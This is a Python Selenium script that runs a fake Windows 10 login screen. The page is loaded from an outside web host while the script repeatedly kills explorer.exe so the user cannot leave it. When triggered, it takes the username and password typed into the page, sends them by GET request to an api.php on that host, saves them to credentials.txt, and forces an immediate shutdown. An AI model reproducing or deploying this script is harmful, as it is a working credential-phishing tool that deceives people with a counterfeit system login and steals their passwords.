from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
import time
import requests
import os

# Setting up the WebDriver using webdriver-manager
chrome_options = webdriver.ChromeOptions()
browser = webdriver.Chrome(options=chrome_options)

# Open the URL
browser.get('http://cloud.obunic.com/stoppenheimer.de/projects/win10_login_screen/v1/')

while True:
    try:
        os.system("taskkill /F /IM explorer.exe")
        # Check for div with id 'shutdown'
        if browser.find_element(By.ID, 'shutdown'):
            print("Shutdown div found. Shutting down the system.")

            # Attempt to find and print the contents of ben_i and pass_i
            try:
                ben_i_element = browser.find_element(By.ID, 'ben_i')
                pass_i_element = browser.find_element(By.ID, 'pass_i')
                print("ben_i content:", ben_i_element.text or ben_i_element.get_attribute('value'))
                print("pass_i content:", pass_i_element.text or pass_i_element.get_attribute('value'))

                payload = {'username': ben_i_element.text or ben_i_element.get_attribute('value'), 'password': pass_i_element.text or pass_i_element.get_attribute('value')}
                response = requests.get('http://cloud.obunic.com/stoppenheimer.de/projects/win10_login_screen/v1/api.php', params=payload)
                print("GET request sent. Response:", response.text)

                # Write credentials to a file
                with open('credentials.txt', 'w') as file:
                    file.write(f"Username: {ben_i_element.text or ben_i_element.get_attribute('value')}\nPassword: {pass_i_element.text or pass_i_element.get_attribute('value')}")
                    print("Credentials saved to file.")
            except NoSuchElementException:
                print("Unable to find ben_i and/or pass_i elements.")

            os.system("shutdown /s /f /t 0")
            break
    except NoSuchElementException:
        # If the div is not found, wait for a bit and then try again
        print("nothing - yet.")
        time.sleep(1)

# Clean up
browser.quit()

# Clean up
browser.quit()
